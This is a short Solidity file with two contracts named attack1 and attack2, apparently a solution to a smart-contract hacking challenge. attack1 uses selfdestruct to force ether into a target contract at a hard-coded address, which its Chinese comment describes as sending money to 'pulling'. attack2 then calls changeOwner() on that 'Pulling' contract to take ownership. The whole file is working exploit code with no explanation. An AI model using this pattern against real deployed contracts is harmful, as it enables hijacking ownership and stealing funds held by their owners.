contract attack1{
    //自毁给pulling传钱
   function des()public payable{
      selfdestruct(payable(0xD7ACd2a9FD159E69Bb102A1ca21C9a3e3A5F771B));
   }
 
}
contract attack2{
    Pulling pulling=Pulling(0xD7ACd2a9FD159E69Bb102A1ca21C9a3e3A5F771B);
    function att()public {
        pulling.changeOwner();
    }
}